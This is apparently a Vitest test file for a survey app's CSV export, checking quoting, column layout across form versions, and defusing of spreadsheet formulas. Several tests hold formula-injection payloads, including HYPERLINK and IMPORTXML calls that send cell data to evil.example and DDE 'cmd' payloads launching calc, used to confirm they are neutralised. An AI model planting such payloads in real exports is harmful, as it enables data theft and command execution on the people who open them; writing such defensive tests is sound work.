import { describe, expect, it } from "vitest";
import { csvCell, responsesToCsv, toCsv } from "./csv";
import type { Answers, Question, ResponseRowDto } from "./types";

/**
 * A minimal RFC 4180 reader, so the tests can check what a spreadsheet would
 * actually see in each cell rather than comparing raw strings.
 */
function parseCsv(csv: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let index = 0; index < csv.length; index += 1) {
    const char = csv[index];
    if (quoted) {
      if (char === '"' && csv[index + 1] === '"') {
        cell += '"';
        index += 1;
      } else if (char === '"') {
        quoted = false;
      } else {
        cell += char;
      }
    } else if (char === '"') {
      quoted = true;
    } else if (char === ",") {
      row.push(cell);
      cell = "";
    } else if (char === "\r" && csv[index + 1] === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
      index += 1;
    } else {
      cell += char;
    }
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

describe("csvCell", () => {
  it("wraps every cell in quotes, including plain and empty ones", () => {
    expect(csvCell("Avery Chen")).toBe('"Avery Chen"');
    expect(csvCell("")).toBe('""');
    expect(csvCell("42")).toBe('"42"');
  });

  it("doubles quotes inside a cell", () => {
    expect(csvCell('She said "hi"')).toBe('"She said ""hi"""');
    expect(csvCell('"')).toBe('""""');
  });

  it("keeps commas and line breaks inside the quoted cell", () => {
    expect(csvCell("one, two\nthree")).toBe('"one, two\nthree"');
  });

  it.each<[string, string]>([
    ["an equals sign", "=1+1"],
    ["a plus sign", "+1+1"],
    ["a minus sign", "-1+1"],
    ["an at sign", "@SUM(A1:A9)"],
    ["a tab", "\t=1+1"],
    ["a carriage return", "\r=1+1"],
  ])("defuses a cell that starts with %s by prefixing an apostrophe", (_label, value) => {
    expect(csvCell(value)).toBe(`"'${value}"`);
  });

  it.each([
    '=HYPERLINK("https://evil.example/?x="&A1,"Click")',
    "=cmd|' /C calc'!A0",
    "@SUM(1+9)*cmd|' /C calc'!A0",
    "+1+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "=IMPORTXML(CONCAT(\"https://evil.example/?v=\", A2), \"//a\")",
  ])("defuses the known injection payload %s", (payload) => {
    const [[cell]] = parseCsv(csvCell(payload));
    expect(cell).toBe(`'${payload}`);
    expect(cell.startsWith("'")).toBe(true);
  });

  it("leaves a cell alone when a formula character appears later in it", () => {
    expect(csvCell("a=b")).toBe('"a=b"');
    expect(csvCell("avery.chen@uci.edu")).toBe('"avery.chen@uci.edu"');
    expect(csvCell("3 - 1")).toBe('"3 - 1"');
    expect(csvCell("C++")).toBe('"C++"');
  });

  it("also prefixes harmless values that merely start with a formula character", () => {
    expect(csvCell("-5")).toBe(`"'-5"`);
    expect(csvCell("+1 949 555 0100")).toBe(`"'+1 949 555 0100"`);
  });
});

describe("toCsv", () => {
  it("joins cells with commas and rows with CRLF, with no trailing line break", () => {
    expect(toCsv([["a", "b"], ["c", "d"]])).toBe('"a","b"\r\n"c","d"');
  });

  it("is empty for no rows", () => {
    expect(toCsv([])).toBe("");
  });

  it("round-trips awkward cells through a CSV reader", () => {
    const rows = [
      ["plain", "with, comma", 'with "quotes"'],
      ["multi\nline", "", "trailing space "],
      ["emoji and accents: café", "tab\tinside", "semi;colon"],
    ];
    expect(parseCsv(toCsv(rows))).toEqual(rows);
  });
});

describe("responsesToCsv", () => {
  const questions: Question[] = [
    { id: "s1", type: "section", title: "About you", description: "" },
    { id: "q_major", type: "short_text", title: "What is your major?", description: "", required: true, validation: "none" },
    {
      id: "q_who",
      type: "multiple_choice",
      title: "Who has this problem?",
      description: "",
      required: true,
      allowOther: true,
      options: [
        { id: "o_a", label: "Students" },
        { id: "o_b", label: "Small businesses" },
      ],
    },
    {
      id: "q_areas",
      type: "checkboxes",
      title: "",
      description: "",
      required: false,
      allowOther: true,
      options: [
        { id: "o_a", label: "AI" },
        { id: "o_b", label: "Health" },
      ],
    },
    { id: "q_conf", type: "linear_scale", title: "Confidence", description: "", required: true, min: 0, max: 10, minLabel: "", maxLabel: "" },
  ];

  const row = (overrides: Partial<ResponseRowDto> & { answers: Answers }): ResponseRowDto => ({
    uid: "uid1",
    displayName: "Avery Chen",
    email: "avery.chen@uci.edu",
    teamId: null,
    questions,
    formVersion: 1,
    startedAt: "2026-10-01T10:00:00.000Z",
    submittedAt: "2026-10-01T10:30:00.000Z",
    durationSeconds: 1800,
    activeSeconds: 1260,
    late: false,
    lateBySeconds: 0,
    ...overrides,
  });

  /** The fixed columns that come before the questions. */
  const FIXED = ["Name", "Email", "Team", "Submitted at (UTC)", "Status", "Minutes from open to submit", "Active minutes"];
  const FIRST_QUESTION = FIXED.length;

  it("writes a header with one column per answerable question, naming untitled ones", () => {
    const [header] = parseCsv(responsesToCsv(questions, []));
    expect(header).toEqual([
      "Name",
      "Email",
      "Team",
      "Submitted at (UTC)",
      "Status",
      "Minutes from open to submit",
      "Active minutes",
      "What is your major?",
      "Who has this problem?",
      "Untitled question",
      "Confidence",
    ]);
  });

  it("writes only the header when there are no responses", () => {
    expect(parseCsv(responsesToCsv(questions, []))).toHaveLength(1);
  });

  it("writes one row per response with every answer rendered as text", () => {
    const csv = responsesToCsv(questions, [
      row({
        answers: {
          q_major: { kind: "text", value: "Informatics" },
          q_who: { kind: "choice", optionId: "o_b", other: null },
          q_areas: { kind: "choices", optionIds: ["o_a", "o_b"], other: "Robotics" },
          q_conf: { kind: "scale", value: 0 },
        },
      }),
      row({
        uid: "uid2",
        displayName: "Jordan Patel",
        email: "jordan.patel@uci.edu",
        submittedAt: "2026-10-03T08:00:00.000Z",
        late: true,
        durationSeconds: 90,
        activeSeconds: 0,
        answers: {
          q_major: { kind: "text", value: "Economics" },
          q_who: { kind: "choice", optionId: null, other: "Nonprofits" },
        },
      }),
    ]);
    expect(parseCsv(csv).slice(1)).toEqual([
      ["Avery Chen", "avery.chen@uci.edu", "", "2026-10-01T10:30:00.000Z", "On time", "30.0", "21.0", "Informatics", "Small businesses", "AI; Health; Other: Robotics", "0"],
      ["Jordan Patel", "jordan.patel@uci.edu", "", "2026-10-03T08:00:00.000Z", "Late", "1.5", "0.0", "Economics", "Other: Nonprofits", "", ""],
    ]);
  });

  it("gives every row the same number of cells as the header", () => {
    const rows = parseCsv(responsesToCsv(questions, [row({ answers: {} }), row({ answers: { q_conf: { kind: "scale", value: 3 } } })]));
    expect(new Set(rows.map((cells) => cells.length))).toEqual(new Set([11]));
  });

  describe("the Team column", () => {
    const teamNames = new Map([
      ["teamatlas", "Team Atlas"],
      ["teamboreal", "Team Boreal"],
    ]);

    it("sits right after Email and names each pledge's team", () => {
      const rows = parseCsv(
        responsesToCsv(
          questions,
          [
            row({ teamId: "teamatlas", answers: {} }),
            row({ uid: "uid2", displayName: "Jordan Patel", email: "jordan.patel@uci.edu", teamId: "teamboreal", answers: {} }),
          ],
          teamNames,
        ),
      );
      expect(rows[0].slice(0, 4)).toEqual(["Name", "Email", "Team", "Submitted at (UTC)"]);
      expect(rows[1].slice(0, 3)).toEqual(["Avery Chen", "avery.chen@uci.edu", "Team Atlas"]);
      expect(rows[2].slice(0, 3)).toEqual(["Jordan Patel", "jordan.patel@uci.edu", "Team Boreal"]);
    });

    it("is empty for a pledge who works on their own", () => {
      const [, cells] = parseCsv(responsesToCsv(questions, [row({ teamId: null, answers: {} })], teamNames));
      expect(cells[2]).toBe("");
    });

    it("is empty, never the raw id, for a team that is not in the list, such as one deleted since", () => {
      const [, cells] = parseCsv(responsesToCsv(questions, [row({ teamId: "teamgone", answers: {} })], teamNames));
      expect(cells[2]).toBe("");
      expect(cells).not.toContain("teamgone");
    });

    it("is empty for everyone when no team names are given", () => {
      const rows = parseCsv(responsesToCsv(questions, [row({ teamId: "teamatlas", answers: {} }), row({ answers: {} })]));
      expect(rows[0][2]).toBe("Team");
      expect(rows.slice(1).map((cells) => cells[2])).toEqual(["", ""]);
    });

    it("does not read a team name from a key every object inherits", () => {
      const [, cells] = parseCsv(responsesToCsv(questions, [row({ teamId: "constructor", answers: {} })], teamNames));
      expect(cells[2]).toBe("");
    });

    it("defuses a formula in a team name written by an admin", () => {
      const risky = new Map([["team1", "=HYPERLINK(\"https://evil.example\")"]]);
      const [, cells] = parseCsv(responsesToCsv(questions, [row({ teamId: "team1", answers: {} })], risky));
      expect(cells[2]).toBe("'=HYPERLINK(\"https://evil.example\")");
    });

    it("leaves the other cells where they were", () => {
      const [, cells] = parseCsv(
        responsesToCsv(questions, [row({ teamId: "teamatlas", answers: { q_major: { kind: "text", value: "Informatics" } } })], teamNames),
      );
      expect(cells.slice(0, FIRST_QUESTION + 1)).toEqual([
        "Avery Chen",
        "avery.chen@uci.edu",
        "Team Atlas",
        "2026-10-01T10:30:00.000Z",
        "On time",
        "30.0",
        "21.0",
        "Informatics",
      ]);
    });
  });

  describe("responses to an earlier version of the form", () => {
    const text = (value: string) => ({ kind: "text", value }) as const;
    /** The form as it was: one more question, and different wording for an option. */
    const earlier: Question[] = [
      { id: "s1", type: "section", title: "About you", description: "" },
      { id: "q_major", type: "short_text", title: "Your major", description: "", required: true, validation: "none" },
      {
        id: "q_who",
        type: "multiple_choice",
        title: "Who has this problem?",
        description: "",
        required: true,
        allowOther: true,
        options: [
          { id: "o_a", label: "Students" },
          { id: "o_b", label: "Small businesses (original wording)" },
          { id: "o_c", label: "Large companies" },
        ],
      },
      {
        id: "q_areas",
        type: "checkboxes",
        title: "Areas",
        description: "",
        required: false,
        allowOther: true,
        options: [
          { id: "o_a", label: "AI" },
          { id: "o_z", label: "Climate" },
        ],
      },
      { id: "q_old", type: "paragraph", title: "Why did you rush?", description: "", required: false },
      { id: "s_old", type: "section", title: "A section that was removed", description: "" },
    ];

    it("gives a question that was removed from the form its own column, marked as removed, after the current ones", () => {
      const rows = parseCsv(
        responsesToCsv(questions, [
          row({ questions: earlier, answers: { q_major: text("Informatics"), q_old: text("For the people.") } }),
          row({ uid: "uid2", displayName: "Jordan Patel", answers: { q_major: text("Economics") } }),
        ]),
      );
      expect(rows[0]).toEqual([...FIXED, "What is your major?", "Who has this problem?", "Untitled question", "Confidence", "Why did you rush? (removed)"]);
      expect(rows[1].slice(FIRST_QUESTION)).toEqual(["Informatics", "", "", "", "For the people."]);
      // A response that never saw the question has an empty cell there, not a missing one.
      expect(rows[2].slice(FIRST_QUESTION)).toEqual(["Economics", "", "", "", ""]);
      expect(new Set(rows.map((cells) => cells.length))).toEqual(new Set([FIXED.length + 5]));
    });

    it("adds no column for a removed question that nobody answered, or for a removed section", () => {
      const [header] = parseCsv(responsesToCsv(questions, [row({ questions: earlier, answers: { q_major: text("Informatics") } })]));
      expect(header).toEqual([...FIXED, "What is your major?", "Who has this problem?", "Untitled question", "Confidence"]);
      expect(header.join("|")).not.toContain("removed");
    });

    it("adds one column per removed question, in the order responses first show them, however many answered it", () => {
      const older: Question[] = [
        ...earlier,
        { id: "q_older", type: "short_text", title: "", description: "", required: false, validation: "none" },
      ];
      const rows = parseCsv(
        responsesToCsv(questions, [
          row({ questions: older, answers: { q_older: text("first"), q_old: text("A") } }),
          row({ uid: "uid2", questions: earlier, answers: { q_old: text("B") } }),
          row({ uid: "uid3", questions: older, answers: { q_older: text("third") } }),
        ]),
      );
      // The first response's snapshot lists q_old before q_older.
      expect(rows[0].slice(FIRST_QUESTION + 4)).toEqual(["Why did you rush? (removed)", "Untitled question (removed)"]);
      expect(rows.slice(1).map((cells) => cells.slice(FIRST_QUESTION + 4))).toEqual([
        ["A", "first"],
        ["B", ""],
        ["", "third"],
      ]);
    });

    it("keeps an option's original label when it has since been renamed", () => {
      const [, cells] = parseCsv(
        responsesToCsv(questions, [row({ questions: earlier, answers: { q_who: { kind: "choice", optionId: "o_b", other: null } } })]),
      );
      expect(cells[FIRST_QUESTION + 1]).toBe("Small businesses (original wording)");
    });

    it("keeps an option's original label when it has since been deleted, for single and multiple choice", () => {
      const [, cells] = parseCsv(
        responsesToCsv(questions, [
          row({
            questions: earlier,
            answers: {
              q_who: { kind: "choice", optionId: "o_c", other: null },
              q_areas: { kind: "choices", optionIds: ["o_a", "o_z"], other: "Robotics" },
            },
          }),
        ]),
      );
      expect(cells[FIRST_QUESTION + 1]).toBe("Large companies");
      expect(cells[FIRST_QUESTION + 2]).toBe("AI; Climate; Other: Robotics");
      expect(cells.join("|")).not.toContain("(removed option)");
    });

    it("reads each response against its own snapshot, so the same option id can mean different wording in two rows", () => {
      const rows = parseCsv(
        responsesToCsv(questions, [
          row({ questions: earlier, answers: { q_who: { kind: "choice", optionId: "o_b", other: null } } }),
          row({ uid: "uid2", answers: { q_who: { kind: "choice", optionId: "o_b", other: null } } }),
        ]),
      );
      expect(rows.slice(1).map((cells) => cells[FIRST_QUESTION + 1])).toEqual([
        "Small businesses (original wording)",
        "Small businesses",
      ]);
    });

    it("heads a column with the question's current title, even for responses that saw an older one", () => {
      const [header, cells] = parseCsv(responsesToCsv(questions, [row({ questions: earlier, answers: { q_major: text("Informatics") } })]));
      expect(header[FIRST_QUESTION]).toBe("What is your major?");
      expect(header).not.toContain("Your major");
      expect(cells[FIRST_QUESTION]).toBe("Informatics");
    });

    it("leaves a cell empty for a question added after the response was sent", () => {
      const before: Question[] = [earlier[1]];
      const [, cells] = parseCsv(responsesToCsv(questions, [row({ questions: before, answers: { q_major: text("Informatics") } })]));
      expect(cells.slice(FIRST_QUESTION)).toEqual(["Informatics", "", "", ""]);
    });

    it("marks an option that is in neither the current form nor the response's own snapshot", () => {
      const csv = responsesToCsv(questions, [row({ answers: { q_who: { kind: "choice", optionId: "o_gone", other: null } } })]);
      const [, cells] = parseCsv(csv);
      expect(cells[FIRST_QUESTION + 1]).toBe("(removed option)");
    });

    it("defuses a formula in the title of a removed question", () => {
      const risky: Question[] = [{ id: "q_x", type: "short_text", title: "=1+1", description: "", required: false, validation: "none" }];
      const [header] = parseCsv(responsesToCsv(questions, [row({ questions: risky, answers: { q_x: text("x") } })]));
      expect(header[header.length - 1]).toBe("'=1+1 (removed)");
    });

    it("does not treat a key every object inherits as an answer to a removed question", () => {
      const inherited: Question[] = [{ id: "constructor", type: "short_text", title: "Inherited", description: "", required: false, validation: "none" }];
      const [header] = parseCsv(responsesToCsv(questions, [row({ questions: inherited, answers: {} })]));
      expect(header).toHaveLength(FIXED.length + 4);
    });
  });

  it("defuses formulas in pledge-supplied answers, names and emails", () => {
    const csv = responsesToCsv(questions, [
      row({
        displayName: "=HYPERLINK(\"https://evil.example\")",
        email: "+evil@uci.edu",
        answers: {
          q_major: { kind: "text", value: "@SUM(A1:A9)" },
          q_who: { kind: "choice", optionId: null, other: "x" },
          q_areas: { kind: "choices", optionIds: [], other: "-1+1" },
        },
      }),
    ]);
    const [, cells] = parseCsv(csv);
    expect(cells[0]).toBe("'=HYPERLINK(\"https://evil.example\")");
    expect(cells[1]).toBe("'+evil@uci.edu");
    expect(cells[FIRST_QUESTION]).toBe("'@SUM(A1:A9)");
    // "Other: " is prepended by answerToText, so these no longer start with a formula character.
    expect(cells[FIRST_QUESTION + 1]).toBe("Other: x");
    expect(cells[FIRST_QUESTION + 2]).toBe("Other: -1+1");
  });

  it("defuses a formula in an answer to a removed question", () => {
    const old: Question[] = [{ id: "q_x", type: "paragraph", title: "Old", description: "", required: false }];
    const [, cells] = parseCsv(responsesToCsv(questions, [row({ questions: old, answers: { q_x: { kind: "text", value: "=cmd|' /C calc'!A0" } } })]));
    expect(cells[cells.length - 1]).toBe("'=cmd|' /C calc'!A0");
  });

  it("defuses a formula in a question title written by an admin", () => {
    const risky: Question[] = [
      { id: "q1", type: "short_text", title: "=1+1", description: "", required: false, validation: "none" },
    ];
    const [header] = parseCsv(responsesToCsv(risky, []));
    expect(header[FIRST_QUESTION]).toBe("'=1+1");
  });

  it("keeps a multi-line paragraph answer inside a single cell", () => {
    const paragraphs: Question[] = [{ id: "q1", type: "paragraph", title: "Story", description: "", required: false }];
    const csv = responsesToCsv(paragraphs, [
      row({ answers: { q1: { kind: "text", value: 'First line\nSecond, with "quotes"' } } }),
    ]);
    const rows = parseCsv(csv);
    expect(rows).toHaveLength(2);
    expect(rows[1][FIRST_QUESTION]).toBe('First line\nSecond, with "quotes"');
  });
});
